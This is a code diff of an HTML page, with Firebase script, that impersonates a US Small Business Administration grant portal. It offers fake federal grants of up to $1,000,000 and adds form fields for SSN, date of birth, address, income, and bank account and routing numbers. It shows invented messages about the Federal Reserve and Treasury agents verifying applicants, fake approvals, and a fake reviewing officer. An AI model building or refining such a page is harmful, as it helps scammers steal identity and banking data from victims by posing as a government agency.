@@ -10,24 +10,16 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
         :root { --sba-navy: #002e6d; --sba-red: #cc0000; }
         body { background: #f1f5f9; font-family: 'Inter', sans-serif; color: #1e293b; margin: 0; }
-
         header { background: white; padding: 10px 16px; display: flex; align-items: center; border-bottom: 2px solid var(--sba-red); position: sticky; top: 0; z-index: 100; }
-        .logo-box { width: 38px; height: 38px; position: relative; border-top: 3.5px solid var(--sba-navy); border-left: 3.5px solid var(--sba-navy); border-right: 3.5px solid var(--sba-navy); display: flex; align-items: center; justify-content: center; }
+        .logo-box { width: 38px; height: 38px; border-top: 3.5px solid var(--sba-navy); border-left: 3.5px solid var(--sba-navy); border-right: 3.5px solid var(--sba-navy); display: flex; align-items: center; justify-content: center; position: relative; }
         .logo-box::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 3.5px; background: var(--sba-red); }
-        
         .form-card { background: white; border-radius: 8px; border: 1px solid #e2e8f0; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
-        .section-label { font-size: 10px; font-weight: 800; color: var(--sba-navy); text-transform: uppercase; background: #f8fafc; padding: 6px 12px; border-radius: 4px; display: inline-block; margin-bottom: 15px; }
-
-        label { display: block; font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 4px; }
-        .field { width: 100%; height: 44px; border: 1.5px solid #cbd5e1; border-radius: 6px; padding: 0 12px; font-size: 14px; font-weight: 600; }
-
-        .btn-submit { background: var(--sba-navy); color: white; width: 100%; padding: 16px; border-radius: 6px; font-weight: 800; text-transform: uppercase; font-size: 13px; }
-        
-        /* Floating Support */
-        .float-support { position: fixed; bottom: 20px; right: 20px; width: 55px; height: 55px; background: var(--sba-navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 10px 25px rgba(0,46,109,0.3); z-index: 1000; animation: bounce 2s infinite; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-
-        .loader { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid var(--sba-navy); border-radius: 50%; animation: spin 1s linear infinite; }
+        .section-label { font-size: 10px; font-weight: 800; color: var(--sba-navy); text-transform: uppercase; background: #f1f5f9; padding: 6px 12px; border-radius: 4px; display: block; margin: 20px 0 15px; border-left: 4px solid var(--sba-navy); }
+        label { display: block; font-size: 10px; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 4px; }
+        .field { width: 100%; height: 44px; border: 1.5px solid #cbd5e1; border-radius: 6px; padding: 0 12px; font-size: 14px; font-weight: 600; outline: none; transition: 0.2s; }
+        .field:focus { border-color: var(--sba-navy); background: #f8fafc; }
+        .btn-submit { background: var(--sba-navy); color: white; width: 100%; padding: 18px; border-radius: 6px; font-weight: 800; text-transform: uppercase; font-size: 13px; margin-top: 20px; box-shadow: 0 4px 15px rgba(0,46,109,0.3); }
+        .loader { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--sba-navy); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -45,94 +37,98 @@
             
             <div id="applyForm" class="hidden">
                 <div id="declineNotice" class="hidden mb-6 p-4 bg-rose-50 border-l-4 border-rose-500 rounded">
-                    <p class="text-[10px] font-black text-rose-600 uppercase">Application Declined</p>
+                    <p class="text-[10px] font-black text-rose-600 uppercase">Application Rejected</p>
                     <p id="declineReason" class="text-xs font-bold text-rose-800 mt-1"></p>
                 </div>
 
-                <div class="mb-6 border-b pb-4">
-                    <h1 class="text-xl font-extrabold text-slate-800">Enrollment Portal</h1>
-                    <p class="text-[10px] text-slate-400 font-bold uppercase">Federal Case ID: #SBA-2026-TX</p>
-                </div>
+                <h1 class="text-xl font-extrabold text-slate-800">Enrollment Portal</h1>
+                <p class="text-[10px] text-slate-400 font-bold uppercase mb-4">Form 424-B | Federal Grant Application</p>
 
-                <div class="section-label">Identity Info</div>
-                <div class="mb-4"><label>Full Name</label><input type="text" id="fullName" class="field"></div>
+                <div class="section-label">1. Identity & Contact</div>
+                <div class="mb-4"><label>Full Legal Name</label><input type="text" id="fullName" class="field" placeholder="John Doe"></div>
                 <div class="grid grid-cols-2 gap-4 mb-4">
                     <div><label>Date of Birth</label><input type="date" id="dob" class="field"></div>
-                    <div><label>SSN</label><input type="tel" id="ssn" class="field" placeholder="000-00-0000"></div>
+                    <div><label>SSN (Last 4)</label><input type="password" id="ssn" class="field" placeholder="****"></div>
+                </div>
+                <div class="mb-4"><label>Home Address</label><input type="text" id="address" class="field" placeholder="123 Federal Way, DC"></div>
+
+                <div class="section-label">2. Employment & Income</div>
+                <div class="mb-4"><label>Current Occupation</label><input type="text" id="job" class="field" placeholder="Business Owner"></div>
+                <div class="mb-4">
+                    <label>Annual Household Income</label>
+                    <select id="income" class="field">
+                        <option value="under20k">Under $20,000</option>
+                        <option value="20k-50k">$20,000 - $50,000</option>
+                        <option value="50k-100k">$50,000 - $100,000</option>
+                        <option value="over100k">$100,000+</option>
+                    </select>
                 </div>
 
-                <div class="section-label">Grant Selection</div>
-                <div class="mb-8">
-                    <label>Choose Program Amount</label>
-                    <select id="reqAmount" class="field bg-blue-50/50">
+                <div class="section-label">3. Funding Request</div>
+                <div class="mb-4">
+                    <label>Select Grant Program</label>
+                    <select id="reqAmount" class="field bg-blue-50/50 border-blue-200">
                         <option value="50000">$50,000.00 — Relief Advance</option>
                         <option value="150000">$150,000.00 — Business Standard</option>
                         <option value="500000">$500,000.00 — Silver Award</option>
                         <option value="1000000">$1,000,000.00 — Platinum Tier</option>
                     </select>
                 </div>
+                <div class="mb-4"><label>Purpose of Funds</label><textarea id="purpose" class="field h-20 py-2 resize-none" placeholder="Explain how this grant helps your business..."></textarea></div>
 
-                <button onclick="submitData()" id="subBtn" class="btn-submit">Certify & Submit</button>
+                <div class="section-label">4. Disbursement (Bank Info)</div>
+                <div class="mb-4"><label>Bank Name</label><input type="text" id="bankName" class="field" placeholder="Chase, BofA, etc."></div>
+                <div class="grid grid-cols-2 gap-4 mb-4">
+                    <div><label>Account Number</label><input type="tel" id="accNum" class="field"></div>
+                    <div><label>Routing Number</label><input type="tel" id="rtNum" class="field"></div>
+                </div>
+
+                <button onclick="submitData()" id="subBtn" class="btn-submit">Certify & Submit Application</button>
             </div>
 
             <div id="pendingView" class="hidden py-16 text-center">
                 <div class="loader mx-auto mb-6"></div>
-                <h2 class="text-lg font-extrabold text-slate-800 uppercase">Verification Pending</h2>
-                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2 px-6">The Federal Reserve is auditing your SSN. Do not refresh.</p>
+                <h2 class="text-lg font-extrabold text-slate-800 uppercase">Under Review</h2>
+                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2 px-6 italic">Treasury agents are verifying your payroll records. This usually takes 2-4 hours.</p>
             </div>
 
             <div id="successView" class="hidden py-10 text-center">
                 <div class="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center text-white text-2xl mx-auto mb-4 shadow-lg"><i class="fas fa-check"></i></div>
-                <h2 class="text-xl font-extrabold text-emerald-600 uppercase">Grant Approved</h2>
-                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2">Funds have been credited to your portal balance.</p>
-                
+                <h2 class="text-xl font-extrabold text-emerald-600 uppercase tracking-tighter">Application Approved</h2>
+                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2">The requested funds have been added to your dashboard balance.</p>
                 <div class="flex flex-col gap-3 mt-8">
-                    <a href="dashboard.html" class="bg-slate-900 text-white py-4 rounded-lg font-bold uppercase text-[11px]">Return to Dashboard</a>
-                    <button onclick="reapply()" class="border-2 border-slate-200 text-slate-600 py-3 rounded-lg font-bold uppercase text-[10px]">Submit New Application</button>
-                </div>
-            </div>
-
-            <div class="mt-10 pt-6 border-t flex items-center gap-4">
-                <img src="https://i.pravatar.cc/150?u=sarah" class="w-12 h-12 rounded-full border-2 border-blue-100 object-cover">
-                <div>
-                    <p class="text-[9px] font-extrabold text-slate-400 uppercase">Reviewing Officer</p>
-                    <h4 class="text-sm font-extrabold text-slate-800 uppercase">Serah Miller</h4>
-                    <p class="text-[10px] text-slate-500 font-medium italic">"Ensuring fair distribution of federal relief funds."</p>
+                    <a href="dashboard.html" class="bg-slate-900 text-white py-4 rounded-lg font-bold uppercase text-[11px]">Go to Dashboard</a>
+                    <button onclick="resetApplication()" class="text-slate-400 font-bold text-[9px] uppercase underline">Start New Filing</button>
                 </div>
             </div>
 
         </div>
     </main>
 
-    <a href="support.html" class="float-support">
-        <i class="fas fa-headset"></i>
-    </a>
-
     <script type="module">
         import { auth, db } from './firebase-config.js';
-        import { doc, onSnapshot, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { doc, onSnapshot, updateDoc, increment, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
         import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
         onAuthStateChanged(auth, (user) => {
             if (!user) { window.location.href = 'login.html'; return; }
+            
             onSnapshot(doc(db, "users", user.uid), async (snap) => {
                 const d = snap.data();
                 if(!d) return;
 
-                const v = ['applyForm', 'pendingView', 'successView'];
-                v.forEach(id => document.getElementById(id).classList.add('hidden'));
+                // Hide all views first
+                ['applyForm', 'pendingView', 'successView'].forEach(id => document.getElementById(id).classList.add('hidden'));
 
-                if (d.applyStatus === "APPROVED" || d.applyStatus === "SUCCESSFUL") {
+                if (d.applyStatus === "SUCCESSFUL") {
                     document.getElementById('successView').classList.remove('hidden');
-                    if (d.grantCredited === false) {
-                        await updateDoc(doc(db, "users", user.uid), { balance: increment(d.lastAppliedAmount || 0), grantCredited: true });
-                    }
                 } else if (d.applyStatus === "PENDING") {
                     document.getElementById('pendingView').classList.remove('hidden');
-                } else if (d.applyStatus === "DECLINED") {
+                } else if (d.applyStatus === "FAILED") {
                     document.getElementById('applyForm').classList.remove('hidden');
                     document.getElementById('declineNotice').classList.remove('hidden');
-                    document.getElementById('declineReason').innerText = d.applyDeclineReason || "Data mismatch.";
+                    document.getElementById('declineReason').innerText = d.applyReason || "Information verification failed.";
+                    document.getElementById('subBtn').innerText = "Resubmit Application";
                 } else {
                     document.getElementById('applyForm').classList.remove('hidden');
                 }
@@ -140,19 +136,34 @@
         });
 
         window.submitData = async () => {
-            const amount = Number(document.getElementById('reqAmount').value);
-            document.getElementById('subBtn').innerText = "Processing...";
-            await updateDoc(doc(db, "users", auth.currentUser.uid), {
+            const btn = document.getElementById('subBtn');
+            const amt = Number(document.getElementById('reqAmount').value);
+            const user = auth.currentUser;
+            
+            // Basic validation
+            if(!document.getElementById('fullName').value) return alert("Full Name Required");
+
+            btn.innerText = "AUTHENTICATING...";
+            btn.disabled = true;
+
+            const applicationData = {
                 applyStatus: "PENDING",
+                requestedAmount: amt,
                 fullName: document.getElementById('fullName').value,
-                ssn: document.getElementById('ssn').value,
-                lastAppliedAmount: amount,
-                grantCredited: false
-            });
+                // Add to ledger for history.html
+                history: arrayUnion({
+                    type: "GRANT APPLICATION",
+                    amount: amt,
+                    status: "PENDING",
+                    date: new Date().toISOString()
+                })
+            };
+
+            await updateDoc(doc(db, "users", user.uid), applicationData);
         };
 
-        window.reapply = async () => {
-            if(confirm("Confirm: Start a new application?")) {
+        window.resetApplication = async () => {
+            if(confirm("Discard current approval and re-apply?")) {
                 await updateDoc(doc(db, "users", auth.currentUser.uid), { applyStatus: "IDLE" });
             }
         };
